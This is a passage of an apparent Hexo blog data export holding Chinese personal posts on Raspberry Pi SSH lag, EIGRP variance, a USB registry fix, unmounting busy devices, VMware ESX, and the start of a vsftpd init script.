/></p>","slug":"日产警车","published":1,"updated":"2023-04-22T05:38:45.085Z","_id":"clgrjlxk300887opiflfq8og4","comments":1,"layout":"post","photos":[],"link":"","content":"<p>日产警车,这种货都有。ZF都是吃屎的啊。<br /></p>","site":{"data":{}},"excerpt":"","more":"<p>日产警车,这种货都有。ZF都是吃屎的啊。<br /></p>"},{"title":"记忆","date":"2010-04-17T12:23:00.000Z","_content":"心情不好时，找个安静的地方<br />带上耳机，把音乐开到最大、<br />那样会让自己学会很多、、<br />也让自己一点点进步、、、","source":"_posts/记忆.md","raw":"title: 记忆\ncategories: [生活感想]\ntags: []\ndate: 2010-04-17 20:23:00\n---\n心情不好时，找个安静的地方<br />带上耳机，把音乐开到最大、<br />那样会让自己学会很多、、<br />也让自己一点点进步、、、","slug":"记忆","published":1,"updated":"2023-04-22T05:38:45.158Z","_id":"clgrjlxk5008b7opial6n52md","comments":1,"layout":"post","photos":[],"link":"","content":"<p>心情不好时，找个安静的地方<br />带上耳机，把音乐开到最大、<br />那样会让自己学会很多、、<br />也让自己一点点进步、、、</p>\n","site":{"data":{}},"excerpt":"","more":"<p>心情不好时，找个安静的地方<br />带上耳机，把音乐开到最大、<br />那样会让自己学会很多、、<br />也让自己一点点进步、、、</p>\n"},{"title":"解决树莓派SSH登录和输入卡顿，试了很多方法","date":"2020-11-21T06:53:39.000Z","_content":"关于树莓派SSH登录和输入卡顿的原因，各种说法都有，多数都说是dns的问题和GSSAPI的问题，试过了都不行，找到一个关于IPQoS 的方法，设置后解决了。\n\n/etc/ssh/sshd_config最后追加\n<code>\nIPQoS cs0 cs0\n</code>\n\nIPQoS的解释\n对应的服务\tIPv4优先级/ EXP / 802.1P\tDSCP(二进制)\tDSCP(十进制)\tTOS(十六进制)\t应用\nBE\t0\t0\t0\t0\tInternet\nAF1 Green\t1\t1010\t10\t28\tLeased Line \nAF2 Green\t2\t10010\t18\t48\tIPTV VOD\nAF3 Green\t3\t11010\t26\t68\tIPTV Broadcast\nAF4 Green\t4\t100010\t34\t88\tNGN/3G Singaling\nEF\t5\t101110\t46\tB8\tNGN/3G voice\nCS6\t6\t110000\t48\tC0\tProtocol\nCS7\t7\t111000\t56\tE0\tProtocol\n","source":"_posts/解决树莓派SSH登录和输入卡顿，试了很多方法.md","raw":"title: 解决树莓派SSH登录和输入卡顿，试了很多方法\ncategories: [操作系统]\ntags: []\ndate: 2020-11-21 14:53:39\n---\n关于树莓派SSH登录和输入卡顿的原因，各种说法都有，多数都说是dns的问题和GSSAPI的问题，试过了都不行，找到一个关于IPQoS 的方法，设置后解决了。\n\n/etc/ssh/sshd_config最后追加\n<code>\nIPQoS cs0 cs0\n</code>\n\nIPQoS的解释\n对应的服务\tIPv4优先级/ EXP / 802.1P\tDSCP(二进制)\tDSCP(十进制)\tTOS(十六进制)\t应用\nBE\t0\t0\t0\t0\tInternet\nAF1 Green\t1\t1010\t10\t28\tLeased Line \nAF2 Green\t2\t10010\t18\t48\tIPTV VOD\nAF3 Green\t3\t11010\t26\t68\tIPTV Broadcast\nAF4 Green\t4\t100010\t34\t88\tNGN/3G Singaling\nEF\t5\t101110\t46\tB8\tNGN/3G voice\nCS6\t6\t110000\t48\tC0\tProtocol\nCS7\t7\t111000\t56\tE0\tProtocol\n","slug":"解决树莓派SSH登录和输入卡顿，试了很多方法","published":1,"updated":"2023-04-22T05:38:45.153Z","_id":"clgrjlxk7008d7opiehu8hvb1","comments":1,"layout":"post","photos":[],"link":"","content":"<p>关于树莓派SSH登录和输入卡顿的原因，各种说法都有，多数都说是dns的问题和GSSAPI的问题，试过了都不行，找到一个关于IPQoS 的方法，设置后解决了。</p>\n<p>&#x2F;etc&#x2F;ssh&#x2F;sshd_config最后追加<br><code><br>IPQoS cs0 cs0<br></code></p>\n<p>IPQoS的解释<br>对应的服务\tIPv4优先级&#x2F; EXP &#x2F; 802.1P\tDSCP(二进制)\tDSCP(十进制)\tTOS(十六进制)\t应用<br>BE\t0\t0\t0\t0\tInternet<br>AF1 Green\t1\t1010\t10\t28\tLeased Line<br>AF2 Green\t2\t10010\t18\t48\tIPTV VOD<br>AF3 Green\t3\t11010\t26\t68\tIPTV Broadcast<br>AF4 Green\t4\t100010\t34\t88\tNGN&#x2F;3G Singaling<br>EF\t5\t101110\t46\tB8\tNGN&#x2F;3G voice<br>CS6\t6\t110000\t48\tC0\tProtocol<br>CS7\t7\t111000\t56\tE0\tProtocol</p>\n","site":{"data":{}},"excerpt":"","more":"<p>关于树莓派SSH登录和输入卡顿的原因，各种说法都有，多数都说是dns的问题和GSSAPI的问题，试过了都不行，找到一个关于IPQoS 的方法，设置后解决了。</p>\n<p>&#x2F;etc&#x2F;ssh&#x2F;sshd_config最后追加<br><code><br>IPQoS cs0 cs0<br></code></p>\n<p>IPQoS的解释<br>对应的服务\tIPv4优先级&#x2F; EXP &#x2F; 802.1P\tDSCP(二进制)\tDSCP(十进制)\tTOS(十六进制)\t应用<br>BE\t0\t0\t0\t0\tInternet<br>AF1 Green\t1\t1010\t10\t28\tLeased Line<br>AF2 Green\t2\t10010\t18\t48\tIPTV VOD<br>AF3 Green\t3\t11010\t26\t68\tIPTV Broadcast<br>AF4 Green\t4\t100010\t34\t88\tNGN&#x2F;3G Singaling<br>EF\t5\t101110\t46\tB8\tNGN&#x2F;3G voice<br>CS6\t6\t110000\t48\tC0\tProtocol<br>CS7\t7\t111000\t56\tE0\tProtocol</p>\n"},{"title":"Variance的计算","date":"2010-03-29T12:43:00.000Z","_content":"<p>Variance是一个乘数,取值范围是1-128之间,缺省值是1,也就是等值路径负载均衡.</p><p>使用时路由器用最小路径的度量值乘以变化因子(乘数)得出一个乘积,该乘积被用于确定一条潜在的路径是否被作为负载均衡使用</p><p>能够被选择作为负载均衡的路径必须满足两个条件:</p><p>路径的度量值必须小于当前最小度量值与变化因子的乘积；</p><p>例如：当前有如下潜在的到达同一目的地的路由，它们的度量值如下：</p><p>route1 1000</p><p>route2 1120</p><p>route3 1200</p><p>route4 1250</p><p>route5 2300</p><p>当前的变化因子：2</p><p>那么，1000*2=2000 ，所以，满足第一个条件的路由是前4条，第五条不能使用，它的度量值大于乘积</p>","source":"_posts/Variance的计算.md","raw":"title: Variance的计算\ncategories: [网络工程]\ntags: []\ndate: 2010-03-29 20:43:00\n---\n<p>Variance是一个乘数,取值范围是1-128之间,缺省值是1,也就是等值路径负载均衡.</p><p>使用时路由器用最小路径的度量值乘以变化因子(乘数)得出一个乘积,该乘积被用于确定一条潜在的路径是否被作为负载均衡使用</p><p>能够被选择作为负载均衡的路径必须满足两个条件:</p><p>路径的度量值必须小于当前最小度量值与变化因子的乘积；</p><p>例如：当前有如下潜在的到达同一目的地的路由，它们的度量值如下：</p><p>route1 1000</p><p>route2 1120</p><p>route3 1200</p><p>route4 1250</p><p>route5 2300</p><p>当前的变化因子：2</p><p>那么，1000*2=2000 ，所以，满足第一个条件的路由是前4条，第五条不能使用，它的度量值大于乘积</p>","slug":"Variance的计算","published":1,"updated":"2023-04-22T05:38:44.704Z","_id":"clgrjlxk8008f7opi2ncv93d5","comments":1,"layout":"post","photos":[],"link":"","content":"<p>Variance是一个乘数,取值范围是1-128之间,缺省值是1,也就是等值路径负载均衡.</p><p>使用时路由器用最小路径的度量值乘以变化因子(乘数)得出一个乘积,该乘积被用于确定一条潜在的路径是否被作为负载均衡使用</p><p>能够被选择作为负载均衡的路径必须满足两个条件:</p><p>路径的度量值必须小于当前最小度量值与变化因子的乘积；</p><p>例如：当前有如下潜在的到达同一目的地的路由，它们的度量值如下：</p><p>route1 1000</p><p>route2 1120</p><p>route3 1200</p><p>route4 1250</p><p>route5 2300</p><p>当前的变化因子：2</p><p>那么，1000*2=2000 ，所以，满足第一个条件的路由是前4条，第五条不能使用，它的度量值大于乘积</p>","site":{"data":{}},"excerpt":"","more":"<p>Variance是一个乘数,取值范围是1-128之间,缺省值是1,也就是等值路径负载均衡.</p><p>使用时路由器用最小路径的度量值乘以变化因子(乘数)得出一个乘积,该乘积被用于确定一条潜在的路径是否被作为负载均衡使用</p><p>能够被选择作为负载均衡的路径必须满足两个条件:</p><p>路径的度量值必须小于当前最小度量值与变化因子的乘积；</p><p>例如：当前有如下潜在的到达同一目的地的路由，它们的度量值如下：</p><p>route1 1000</p><p>route2 1120</p><p>route3 1200</p><p>route4 1250</p><p>route5 2300</p><p>当前的变化因子：2</p><p>那么，1000*2=2000 ，所以，满足第一个条件的路由是前4条，第五条不能使用，它的度量值大于乘积</p>"},{"title":"USB 控制器驱动的那点事","date":"2011-01-13T02:25:00.000Z","_content":"<p>前几天，同事的USB不能用了。设备管理器里面USB控制器显示的是黄叹号。把设备卸载掉以后，安装驱动，还是不能用。</p><p>他下载一个驱动精灵也不可以。都是做技术的，当时很鄙视他，现在鄙视我自己了。因为公司事是比较多，年底了比较忙，没有给他用，他重装系统了，重装系统后好了。</p><p>昨天他的U盘不能用了，不知道是加密了还是怎么了，提示格式化。格式化也格式化不了，下载低格工具也不行，linux下也格式化不了。他出差了，把U盘丢给我，让我给他看看。</p><p>下载一个U盘量产工具，低格一个就好了。郁闷的事发生了，今天我的USB控制台也成黄叹号了。</p><p>进入系统，提示发现新硬件，机器很卡。还是那样做安装驱动呗。卸载设备驱动。用驱动精灵安装驱动，我晕，驱动精灵一点没有检测出来新硬件，不知道他判断的是什么东西，注册表？。</p><p>进设备管理器，右击属性，说注册表被破坏了。也许就量产U盘工具加载驱动的时候，加载错了。</p><p>进入注册表regedit&nbsp;</p><p>[HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlClass 设备驱动注册表的位置</p><p>{36FC9E60-C465-11CF-8056-444553540000}]&nbsp;&nbsp; USB控制器的项，有可能你的和我的不一样，有说明的。</p><p>下面这是我的</p><p><br />[HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlClass{36FC9E60-C465-11CF-8056-444553540000}]<br />&quot;Class&quot;=&quot;USB&quot;<br />@=&quot;通用串行总线控制器&quot;<br />&quot;Icon&quot;=&quot;-20&quot;<br />&quot;NoInstallClass&quot;=&quot;1&quot;<br />&quot;TroubleShooter-0&quot;=&quot;hcp://help/tshoot/tsUSB.htm&quot;</p><p>写着通用串行总线控制器的就是。</p><p>看看有没有未知的驱动的项，删除掉就OK了。</p><p>进设备管理器，重新扫描硬件设备，系统就会发现USB hub。自动会搜索驱动。USB2.0驱动一般系统自带。</p><p>ok 干活。</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p>","source":"_posts/USB-控制器驱动的那点事.md","raw":"title: USB 控制器驱动的那点事\ncategories: [Windows]\ntags: []\ndate: 2011-01-13 10:25:00\n---\n<p>前几天，同事的USB不能用了。设备管理器里面USB控制器显示的是黄叹号。把设备卸载掉以后，安装驱动，还是不能用。</p><p>他下载一个驱动精灵也不可以。都是做技术的，当时很鄙视他，现在鄙视我自己了。因为公司事是比较多，年底了比较忙，没有给他用，他重装系统了，重装系统后好了。</p><p>昨天他的U盘不能用了，不知道是加密了还是怎么了，提示格式化。格式化也格式化不了，下载低格工具也不行，linux下也格式化不了。他出差了，把U盘丢给我，让我给他看看。</p><p>下载一个U盘量产工具，低格一个就好了。郁闷的事发生了，今天我的USB控制台也成黄叹号了。</p><p>进入系统，提示发现新硬件，机器很卡。还是那样做安装驱动呗。卸载设备驱动。用驱动精灵安装驱动，我晕，驱动精灵一点没有检测出来新硬件，不知道他判断的是什么东西，注册表？。</p><p>进设备管理器，右击属性，说注册表被破坏了。也许就量产U盘工具加载驱动的时候，加载错了。</p><p>进入注册表regedit&nbsp;</p><p>[HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlClass 设备驱动注册表的位置</p><p>{36FC9E60-C465-11CF-8056-444553540000}]&nbsp;&nbsp; USB控制器的项，有可能你的和我的不一样，有说明的。</p><p>下面这是我的</p><p><br />[HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlClass{36FC9E60-C465-11CF-8056-444553540000}]<br />&quot;Class&quot;=&quot;USB&quot;<br />@=&quot;通用串行总线控制器&quot;<br />&quot;Icon&quot;=&quot;-20&quot;<br />&quot;NoInstallClass&quot;=&quot;1&quot;<br />&quot;TroubleShooter-0&quot;=&quot;hcp://help/tshoot/tsUSB.htm&quot;</p><p>写着通用串行总线控制器的就是。</p><p>看看有没有未知的驱动的项，删除掉就OK了。</p><p>进设备管理器，重新扫描硬件设备，系统就会发现USB hub。自动会搜索驱动。USB2.0驱动一般系统自带。</p><p>ok 干活。</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p>","slug":"USB-控制器驱动的那点事","published":1,"updated":"2023-04-22T05:38:44.699Z","_id":"clgrjlxk9008h7opi4cqvduhf","comments":1,"layout":"post","photos":[],"link":"","content":"<p>前几天，同事的USB不能用了。设备管理器里面USB控制器显示的是黄叹号。把设备卸载掉以后，安装驱动，还是不能用。</p><p>他下载一个驱动精灵也不可以。都是做技术的，当时很鄙视他，现在鄙视我自己了。因为公司事是比较多，年底了比较忙，没有给他用，他重装系统了，重装系统后好了。</p><p>昨天他的U盘不能用了，不知道是加密了还是怎么了，提示格式化。格式化也格式化不了，下载低格工具也不行，linux下也格式化不了。他出差了，把U盘丢给我，让我给他看看。</p><p>下载一个U盘量产工具，低格一个就好了。郁闷的事发生了，今天我的USB控制台也成黄叹号了。</p><p>进入系统，提示发现新硬件，机器很卡。还是那样做安装驱动呗。卸载设备驱动。用驱动精灵安装驱动，我晕，驱动精灵一点没有检测出来新硬件，不知道他判断的是什么东西，注册表？。</p><p>进设备管理器，右击属性，说注册表被破坏了。也许就量产U盘工具加载驱动的时候，加载错了。</p><p>进入注册表regedit&nbsp;</p><p>[HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlClass 设备驱动注册表的位置</p><p>{36FC9E60-C465-11CF-8056-444553540000}]&nbsp;&nbsp; USB控制器的项，有可能你的和我的不一样，有说明的。</p><p>下面这是我的</p><p><br />[HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlClass{36FC9E60-C465-11CF-8056-444553540000}]<br />&quot;Class&quot;=&quot;USB&quot;<br />@=&quot;通用串行总线控制器&quot;<br />&quot;Icon&quot;=&quot;-20&quot;<br />&quot;NoInstallClass&quot;=&quot;1&quot;<br />&quot;TroubleShooter-0&quot;=&quot;hcp://help/tshoot/tsUSB.htm&quot;</p><p>写着通用串行总线控制器的就是。</p><p>看看有没有未知的驱动的项，删除掉就OK了。</p><p>进设备管理器，重新扫描硬件设备，系统就会发现USB hub。自动会搜索驱动。USB2.0驱动一般系统自带。</p><p>ok 干活。</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p>","site":{"data":{}},"excerpt":"","more":"<p>前几天，同事的USB不能用了。设备管理器里面USB控制器显示的是黄叹号。把设备卸载掉以后，安装驱动，还是不能用。</p><p>他下载一个驱动精灵也不可以。都是做技术的，当时很鄙视他，现在鄙视我自己了。因为公司事是比较多，年底了比较忙，没有给他用，他重装系统了，重装系统后好了。</p><p>昨天他的U盘不能用了，不知道是加密了还是怎么了，提示格式化。格式化也格式化不了，下载低格工具也不行，linux下也格式化不了。他出差了，把U盘丢给我，让我给他看看。</p><p>下载一个U盘量产工具，低格一个就好了。郁闷的事发生了，今天我的USB控制台也成黄叹号了。</p><p>进入系统，提示发现新硬件，机器很卡。还是那样做安装驱动呗。卸载设备驱动。用驱动精灵安装驱动，我晕，驱动精灵一点没有检测出来新硬件，不知道他判断的是什么东西，注册表？。</p><p>进设备管理器，右击属性，说注册表被破坏了。也许就量产U盘工具加载驱动的时候，加载错了。</p><p>进入注册表regedit&nbsp;</p><p>[HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlClass 设备驱动注册表的位置</p><p>{36FC9E60-C465-11CF-8056-444553540000}]&nbsp;&nbsp; USB控制器的项，有可能你的和我的不一样，有说明的。</p><p>下面这是我的</p><p><br />[HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlClass{36FC9E60-C465-11CF-8056-444553540000}]<br />&quot;Class&quot;=&quot;USB&quot;<br />@=&quot;通用串行总线控制器&quot;<br />&quot;Icon&quot;=&quot;-20&quot;<br />&quot;NoInstallClass&quot;=&quot;1&quot;<br />&quot;TroubleShooter-0&quot;=&quot;hcp://help/tshoot/tsUSB.htm&quot;</p><p>写着通用串行总线控制器的就是。</p><p>看看有没有未知的驱动的项，删除掉就OK了。</p><p>进设备管理器，重新扫描硬件设备，系统就会发现USB hub。自动会搜索驱动。USB2.0驱动一般系统自带。</p><p>ok 干活。</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p>"},{"title":"umount device is busy 问题总结","date":"2011-02-21T08:01:00.000Z","_content":"<p>一个同事最近几次发现mount了一个网络共享磁盘后， 就无法umount, 老是提示：device is busy， 服务又不能停止的。</p><p>看看于是总结了一下几点。</p><p>1.是否在使用本挂载目录，现在路径在挂载目录下，会出现本提示。</p><p>2.也可以使用 shell&gt;fuser&nbsp; -m 挂载目录&nbsp; 查到pid后，直接kill掉。</p><p>&nbsp;&nbsp; 或者 shell&gt;fuser&nbsp; -k 挂载目录&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 直接结束掉。（有的版本没有这个选项）</p><p>3.如果以上方法还是提示设备在使用中 </p><p>&nbsp;shell&gt;umount -fl&nbsp; 挂载目录</p><p>4.最绝的方法就是重启机器，有自启动挂载的话，在/etc/fstab里面去掉，重启解挂。。</p>","source":"_posts/umount-device-is-busy-问题总结.md","raw":"title: umount device is busy 问题总结\ncategories: [Linux]\ntags: []\ndate: 2011-02-21 16:01:00\n---\n<p>一个同事最近几次发现mount了一个网络共享磁盘后， 就无法umount, 老是提示：device is busy， 服务又不能停止的。</p><p>看看于是总结了一下几点。</p><p>1.是否在使用本挂载目录，现在路径在挂载目录下，会出现本提示。</p><p>2.也可以使用 shell&gt;fuser&nbsp; -m 挂载目录&nbsp; 查到pid后，直接kill掉。</p><p>&nbsp;&nbsp; 或者 shell&gt;fuser&nbsp; -k 挂载目录&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 直接结束掉。（有的版本没有这个选项）</p><p>3.如果以上方法还是提示设备在使用中 </p><p>&nbsp;shell&gt;umount -fl&nbsp; 挂载目录</p><p>4.最绝的方法就是重启机器，有自启动挂载的话，在/etc/fstab里面去掉，重启解挂。。</p>","slug":"umount-device-is-busy-问题总结","published":1,"updated":"2023-04-22T05:38:44.924Z","_id":"clgrjlxka008j7opi9zatclt6","comments":1,"layout":"post","photos":[],"link":"","content":"<p>一个同事最近几次发现mount了一个网络共享磁盘后， 就无法umount, 老是提示：device is busy， 服务又不能停止的。</p><p>看看于是总结了一下几点。</p><p>1.是否在使用本挂载目录，现在路径在挂载目录下，会出现本提示。</p><p>2.也可以使用 shell&gt;fuser&nbsp; -m 挂载目录&nbsp; 查到pid后，直接kill掉。</p><p>&nbsp;&nbsp; 或者 shell&gt;fuser&nbsp; -k 挂载目录&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 直接结束掉。（有的版本没有这个选项）</p><p>3.如果以上方法还是提示设备在使用中 </p><p>&nbsp;shell&gt;umount -fl&nbsp; 挂载目录</p><p>4.最绝的方法就是重启机器，有自启动挂载的话，在/etc/fstab里面去掉，重启解挂。。</p>","site":{"data":{}},"excerpt":"","more":"<p>一个同事最近几次发现mount了一个网络共享磁盘后， 就无法umount, 老是提示：device is busy， 服务又不能停止的。</p><p>看看于是总结了一下几点。</p><p>1.是否在使用本挂载目录，现在路径在挂载目录下，会出现本提示。</p><p>2.也可以使用 shell&gt;fuser&nbsp; -m 挂载目录&nbsp; 查到pid后，直接kill掉。</p><p>&nbsp;&nbsp; 或者 shell&gt;fuser&nbsp; -k 挂载目录&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 直接结束掉。（有的版本没有这个选项）</p><p>3.如果以上方法还是提示设备在使用中 </p><p>&nbsp;shell&gt;umount -fl&nbsp; 挂载目录</p><p>4.最绝的方法就是重启机器，有自启动挂载的话，在/etc/fstab里面去掉，重启解挂。。</p>"},{"title":"Vmware ESX 安装 一个郁闷啊","date":"2010-12-10T14:02:00.000Z","_content":"<p>在vmware 7.0下安装&nbsp;&nbsp; VMware.ESX.虚拟机3.5，真纠结啊。</p><p>安装至少使用1G的内存，我的本就两个G，可怜啊，分给他一个G吧。</p><p>安装还挺速度，比常见的linux发行版都快（那次在G41的主板上安装linux，就5分钟，安装速度一个字快。）。一会就安装。</p><p>&nbsp;</p><p>郁闷的是，启动的时候太慢了。2个小时还没有启动起来，启动到sshd，虽然快到登陆界面了，但我还是把虚拟机关了。</p><p>2个小时，我的本快烧了，内存虽然给他1G，但vmware ESX从开机到关闭，我的CPU都是100%，满满的啊。</p><p>心疼我的本啊。难道是我的cpu不知道完全虚拟机的问题，CPU使用率太高了。</p><p>突然闻到了点糊味，吓坏了。原来是后面的电热风的问题。吓吓吓啊、</p><p>&nbsp;</p><p>不敢玩了，有时间用公司真实机做，不支持完全虚拟化。</p>","source":"_posts/Vmware-ESX-安装-一个郁闷啊.md","raw":"title: Vmware ESX 安装 一个郁闷啊\ncategories: [Linux]\ntags: []\ndate: 2010-12-10 22:02:00\n---\n<p>在vmware 7.0下安装&nbsp;&nbsp; VMware.ESX.虚拟机3.5，真纠结啊。</p><p>安装至少使用1G的内存，我的本就两个G，可怜啊，分给他一个G吧。</p><p>安装还挺速度，比常见的linux发行版都快（那次在G41的主板上安装linux，就5分钟，安装速度一个字快。）。一会就安装。</p><p>&nbsp;</p><p>郁闷的是，启动的时候太慢了。2个小时还没有启动起来，启动到sshd，虽然快到登陆界面了，但我还是把虚拟机关了。</p><p>2个小时，我的本快烧了，内存虽然给他1G，但vmware ESX从开机到关闭，我的CPU都是100%，满满的啊。</p><p>心疼我的本啊。难道是我的cpu不知道完全虚拟机的问题，CPU使用率太高了。</p><p>突然闻到了点糊味，吓坏了。原来是后面的电热风的问题。吓吓吓啊、</p><p>&nbsp;</p><p>不敢玩了，有时间用公司真实机做，不支持完全虚拟化。</p>","slug":"Vmware-ESX-安装-一个郁闷啊","published":1,"updated":"2023-04-22T05:38:44.706Z","_id":"clgrjlxka008l7opi824jbnsh","comments":1,"layout":"post","photos":[],"link":"","content":"<p>在vmware 7.0下安装&nbsp;&nbsp; VMware.ESX.虚拟机3.5，真纠结啊。</p><p>安装至少使用1G的内存，我的本就两个G，可怜啊，分给他一个G吧。</p><p>安装还挺速度，比常见的linux发行版都快（那次在G41的主板上安装linux，就5分钟，安装速度一个字快。）。一会就安装。</p><p>&nbsp;</p><p>郁闷的是，启动的时候太慢了。2个小时还没有启动起来，启动到sshd，虽然快到登陆界面了，但我还是把虚拟机关了。</p><p>2个小时，我的本快烧了，内存虽然给他1G，但vmware ESX从开机到关闭，我的CPU都是100%，满满的啊。</p><p>心疼我的本啊。难道是我的cpu不知道完全虚拟机的问题，CPU使用率太高了。</p><p>突然闻到了点糊味，吓坏了。原来是后面的电热风的问题。吓吓吓啊、</p><p>&nbsp;</p><p>不敢玩了，有时间用公司真实机做，不支持完全虚拟化。</p>","site":{"data":{}},"excerpt":"","more":"<p>在vmware 7.0下安装&nbsp;&nbsp; VMware.ESX.虚拟机3.5，真纠结啊。</p><p>安装至少使用1G的内存，我的本就两个G，可怜啊，分给他一个G吧。</p><p>安装还挺速度，比常见的linux发行版都快（那次在G41的主板上安装linux，就5分钟，安装速度一个字快。）。一会就安装。</p><p>&nbsp;</p><p>郁闷的是，启动的时候太慢了。2个小时还没有启动起来，启动到sshd，虽然快到登陆界面了，但我还是把虚拟机关了。</p><p>2个小时，我的本快烧了，内存虽然给他1G，但vmware ESX从开机到关闭，我的CPU都是100%，满满的啊。</p><p>心疼我的本啊。难道是我的cpu不知道完全虚拟机的问题，CPU使用率太高了。</p><p>突然闻到了点糊味，吓坏了。原来是后面的电热风的问题。吓吓吓啊、</p><p>&nbsp;</p><p>不敢玩了，有时间用公司真实机做，不支持完全虚拟化。</p>"},{"title":"vsftpd 服务脚本","date":"2011-06-20T07:04:00.000Z","_content":"<p>&nbsp;</p><p>#!/bin/bash</p><p>#by:key1088</p><p>#description:vsftpd</p><p>#conf:/etc/vsftpd/vsftp.conf</p><p>#cp vsftpd &nbsp;/etc/init.d/vsftpd</p><p>#chmod 755 /etc/init.d/vsftpd</p><p>#chkconfig --add vsftpd&nbsp;</p><p>#chkconfig vsftpd on</p><p>&nbsp;</p><p>&nbsp;</p><p>if [ -f /etc/init.d/functions ]&nbsp;</p><p>then</p><p>. /etc/init.d/functions</p><p>elif [ -f /etc/rc.d/init.d/functions ]</p><p>then</p><p>. /etc/rc.d/init.d/functions</p><p>else</p><p>exit 0</p><p>fi</p><p>vsftpd=/usr/local/sbin/vsftpd &nbsp; &nbsp; &nbsp;</p><p>ftpconf=/etc/vsftpd/vsftpd.conf</p><p>prog=vsftpd</p><p>RETVAL=0</p><p>start() {</p><p>&nbsp; &nbsp; &nbsp; &nbsp; if [ -n &quot;`/sbin/pidof $prog`&quot; ]</p><p>&nbsp; &nbsp; &nbsp; &nbsp; then</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; echo &quot;$prog: already running&quot; &nbsp; &nbsp; &nbsp;&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return 1</p><p>&nbsp; &nbsp; &nbsp; &nbsp; fi</p><p>&nbsp; &nbsp; &nbsp; &nbsp; echo &quot;Starting $prog:&quot;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; base=$prog</p><p>&nbsp; &nbsp; &nbsp; &nbsp; $vsftpd $ftpconf&amp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; if [ -z &quot;`/sbin/pidof $prog`&quot; ]</p><p>&nbsp; &nbsp; &nbsp; &nbsp; then</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; RETVAL=1</p><p>&nbsp; &nbsp; &nbsp; &nbsp; fi</p><p>&nbsp; &nbsp; &nbsp; &nbsp; if [ $RETVAL -ne 0 ] &nbsp; &nbsp; &nbsp;&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; then</p><p>&nbsp; &nbsp; &nbsp; &nbsp; echo &quot;Startup failure&quot;&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; else</p><p>&nbsp; &nbsp; &nbsp; &nbsp; echo &quot;Startup success&quot; &nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; fi</p><p>&nbsp; &nbsp; &nbsp; &nbsp; return $RETVAL</p><p>}</p><p>&nbsp;</p><p>stop() {</p><p>if [ -z &quot;`/sbin/pidof $prog`&quot; ]</p><p>then</p><p>RETVAL=1</p><p>fi</p><p>if [ $RETVAL -ne 0 ]</p><p>then</p><p>echo &quot;vsftpd no have run&quot;</p><p>else</p><p>&nbsp; &nbsp; &nbsp; &nbsp; echo &quot;Stopping $prog:&quot;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; killall $vsftpd</p><p>&nbsp; &nbsp; &nbsp; &nbsp; RETVAL=$?</p><p>&nbsp; &nbsp; &nbsp; &nbsp; if [ $RETVAL -ne 0 ]</p><p>&nbsp; &nbsp; &nbsp; &nbsp; then</p><p>&nbsp; &nbsp; &nbsp; &nbsp; echo &quot;Shutdown failure&quot; &nbsp;&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; else</p><p>&nbsp; &nbsp; &nbsp; &nbsp; echo &quot;Shutdown success&quot; &nbsp; &nbsp;&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; fi</p><p>fi</p><p>}</p><p>&nbsp;</p><p>case &quot;$1&quot; in</p><p>start)</p><p>&nbsp; &nbsp; &nbsp; &nbsp; start &nbsp; &nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; ;;</p><p>stop)</p><p>&nbsp; &nbsp; &nbsp; &nbsp; stop &nbsp;&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; ;;</p><p>status)</p><p>&nbsp; &nbsp; &nbsp; &nbsp; status $vsftpd</p><p>&nbsp; &nbsp; &nbsp; &nbsp; RETVAL=$? &nbsp; &nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; ;;</p><p>restart)</p><p>&nbsp; &nbsp; &nbsp; &nbsp; stop</p><p>&nbsp; &nbsp; &nbsp; &nbsp; start</p><p>&nbsp; &nbsp; &nbsp; &nbsp; ;;</p><p>*)</p><p>&nbsp; &nbsp; &nbsp; &nbsp; echo &quot;Usage: $prog {start|stop|restart|status}&quot;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; exit 1</p><p>esac</p><p>exit $RETVAL</p><br /><p></p>","source":"_posts/vsftpd-服务脚本.md","raw":"title: vsftpd 服务脚本\ncategories: [Linux,Shell编程]\ntags: []\ndate: 2011-06-20 15:04:00\n---\n<p>&nbsp;</p><p>#!/bin/bash</p><p>#by:key1088</p><p>#description:vsftpd</p><p>#conf:/etc/vsftpd/vsftp.conf</p><p>#cp vsftpd &nbsp;/etc/init.d/vsftpd</p><p>#chmod 755 /etc/init.d/vsftpd</p><p>#chkconfig --add vsftpd&nbsp;</p><p>#chkconfig vsftpd on</p><p>&nbsp;</p><p>&nbsp;</p><p>if [ -f /etc/init.d/functions ]&nbsp;</p><p>then</p><p>. /etc/init.d/functions</p><p>elif [ -f /etc/rc.d/init.d/functions ]</p><p>then</p><p>. /etc/rc.d/init.d/functions</p><p>else</p><p>exit 0</p><p>fi</p><p>vsftpd=/usr/local/sbin/vsftpd &nbsp; &nbsp; 